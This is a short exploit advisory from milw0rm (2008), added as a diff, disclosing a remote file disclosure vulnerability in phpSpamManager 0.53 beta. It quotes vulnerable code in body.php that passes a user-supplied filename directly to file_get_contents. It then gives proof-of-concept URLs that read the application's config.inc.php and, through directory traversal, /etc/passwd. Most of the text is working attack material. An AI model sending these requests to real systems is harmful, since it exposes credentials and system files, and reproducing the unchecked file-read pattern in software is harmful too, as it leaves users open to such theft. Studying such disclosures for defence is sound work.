@@ -1,0 +1,20 @@
+phpSpamManager 0.53 beta (body.php) Remote File Disclosure Vulnerability
+D.Script : http://sourceforge.net/project/showfiles.php?group_id=141000
+Vuln Code 
+Ln 38 -> 47 : 
+//get filename
+     $okprint=false;
+     $filename = $_REQUEST['filename']; <--- XxX
+     if ($filename!='FILENAME')
+     {
+      debug_print("analysing " .$filename);
+      //replace # by dots if necessary
+      $filename = preg_replace("/#/",".",$filename);
+$mailtext=file_get_contents($filename); <--- XxX
+	 $email=new parseMail($mailtext); <--- XxX
+POC :
+/phpspammanager.0.53.dev/body.php?filename=include/config.inc.php
+/phpspammanager.0.53.dev/body.php?filename=../../../../../../../../etc/passwd
+                     I'm Mahmood_ali --- I'm Tryagi
+
+# milw0rm.com [2008-03-31]
